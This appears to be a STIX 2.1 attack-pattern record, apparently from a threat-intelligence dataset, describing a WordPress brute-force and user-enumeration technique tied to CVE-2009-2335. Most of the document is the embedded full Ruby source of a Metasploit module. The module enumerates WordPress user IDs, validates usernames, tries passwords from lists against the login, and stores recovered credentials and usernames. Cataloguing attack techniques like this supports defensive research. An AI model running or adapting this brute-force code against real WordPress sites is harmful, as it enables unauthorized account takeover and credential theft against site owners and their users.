{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6b0c17e3-34b5-4b0e-8cd8-abf801638b70",
    "created": "2024-08-14T16:31:07.475334Z",
    "modified": "2024-08-14T16:31:07.475338Z",
    "name": "WordPress Brute Force and User Enumeration Utility",
    "description": "WordPress Authentication Brute Force and User Enumeration Utility",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wordpress_login_enum.rb",
            "external_id": "wordpress_login_enum.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2335"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n\n  def initialize\n    super(\n      'Name'          => 'WordPress Brute Force and User Enumeration Utility',\n      'Description'   => 'WordPress Authentication Brute Force and User Enumeration Utility',\n      'Author'        =>\n        [\n          'Tiago Ferreira <tiago.ccna[at]gmail.com>',\n          'Zach Grace <zgrace[at]404labs.com>',\n          'Christian Mehlmauer'\n        ],\n      'References'     =>\n        [\n          ['BID', '35581'],\n          ['CVE', '2009-2335'],\n          ['OSVDB', '55713']\n        ],\n      'License'        =>  MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptBool.new('VALIDATE_USERS', [ true, 'Validate usernames', true ]),\n        OptBool.new('BRUTEFORCE', [ true, 'Perform brute force authentication', true ]),\n        OptBool.new('ENUMERATE_USERNAMES', [ true, 'Enumerate usernames', true ]),\n        OptInt.new('RANGE_START', [false, 'First user id to enumerate', 1]),\n        OptInt.new('RANGE_END', [false, 'Last user id to enumerate', 10])\n    ])\n\n  end\n\n  def run_host(ip)\n\n    unless wordpress_and_online?\n      print_error(\"#{target_uri} does not seem to be WordPress site\")\n      return\n    end\n\n    version = wordpress_version\n    print_status(\"#{target_uri} - WordPress Version #{version} detected\") if version\n\n    usernames = []\n    if datastore['ENUMERATE_USERNAMES']\n      vprint_status(\"#{target_uri} - WordPress User-Enumeration - Running User Enumeration\")\n      usernames = enum_usernames\n    end\n\n    if datastore['VALIDATE_USERS']\n      @users_found = {}\n      vprint_status(\"#{target_uri} - WordPress User-Validation - Running User Validation\")\n      each_user_pass { |user, pass|\n        validate_user(user)\n      }\n\n      unless @users_found.empty?\n        print_good(\"#{target_uri} - WordPress User-Validation - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? \"user\" : \"users\"}\")\n      end\n    end\n\n    if datastore['BRUTEFORCE']\n      vprint_status(\"#{target_uri} - WordPress Brute Force - Running Bruteforce\")\n      if datastore['VALIDATE_USERS']\n        if @users_found && @users_found.keys.size > 0\n          vprint_status(\"#{target_uri} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? \"user\" : \"users\"}\")\n        end\n      end\n\n      # Brute-force using files.\n      each_user_pass { |user, pass|\n        if datastore['VALIDATE_USERS']\n          next unless @users_found[user]\n        end\n\n        do_login(user, pass)\n      }\n\n      # Brute force previously found users\n      if not usernames.empty?\n        print_status(\"#{target_uri} - Brute-forcing previously found accounts...\")\n        passwords = load_password_vars\n        usernames.each do |user|\n          passwords.each do |pass|\n            do_login(user, pass)\n          end\n        end\n      end\n\n    end\n  end\n\n  def validate_user(user=nil)\n    print_status(\"#{target_uri} - WordPress User-Validation - Checking Username:'#{user}'\")\n\n    exists = wordpress_user_exists?(user)\n    if exists\n      print_good(\"#{target_uri} - WordPress User-Validation - Username: '#{user}' - is VALID\")\n      connection_details = {\n        module_fullname: self.fullname,\n        username: user,\n        workspace_id: myworkspace_id,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_details)\n\n      framework.db.create_credential_and_login(connection_details)\n      @users_found[user] = :reported\n      return :next_user\n    else\n      vprint_error(\"#{target_uri} - WordPress User-Validation - Invalid Username: '#{user}'\")\n      return :skip_user\n    end\n  end\n\n\n  def do_login(user=nil, pass=nil)\n    vprint_status(\"#{target_uri} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'\")\n\n    cookie = wordpress_login(user, pass)\n\n    if cookie\n      print_good(\"#{target_uri} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'\")\n\n      store_valid_credential(user: user, private: pass, proof: cookie)\n\n      return :next_user\n    else\n      vprint_error(\"#{target_uri} - WordPress Brute Force - Failed to login as '#{user}'\")\n      return\n    end\n  end\n\n  def enum_usernames\n    usernames = []\n    for i in datastore['RANGE_START']..datastore['RANGE_END']\n      username = wordpress_userid_exists?(i)\n      if username\n        print_good \"#{target_uri} - Found user '#{username}' with id #{i.to_s}\"\n        usernames << username\n      end\n    end\n\n    if not usernames.empty?\n      p = store_loot('wordpress.users', 'text/plain', rhost, usernames * \"\\n\", \"#{rhost}_wordpress_users.txt\")\n      print_good(\"#{target_uri} - Usernames stored in: #{p}\")\n    end\n\n    return usernames\n  end\nend\n"
}